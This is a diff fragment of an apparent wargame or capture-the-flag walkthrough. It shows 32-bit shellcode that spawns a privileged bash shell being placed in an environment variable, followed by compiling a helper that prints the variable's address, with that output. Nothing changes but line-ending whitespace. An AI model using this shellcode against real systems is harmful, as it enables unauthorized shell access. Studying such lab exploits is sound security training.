@@ -15,10 +15,10 @@ Make a file /tmp/getenvvaraddr.c in the tmp directory to find the address of the
 Now make an enviornment variable with the shellcode we used from the previous challenges stored in it:
 export LVL8="$(perl -e 'print"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')"  
 
-Now compile the c file we made and run it with the name of this enviornment variable.
-$ gcc -m32 getenvvaraddr.c -o getenvvaraddr
-$ ./getenvvaraddr LVL8
-This gives us the following output:
+Now compile the c file we made and run it with the name of this enviornment variable.  
+$ gcc -m32 getenvvaraddr.c -o getenvvaraddr  
+$ ./getenvvaraddr LVL8  
+This gives us the following output:  
 addr of LVL8: 0xffffdfa5  
 
 
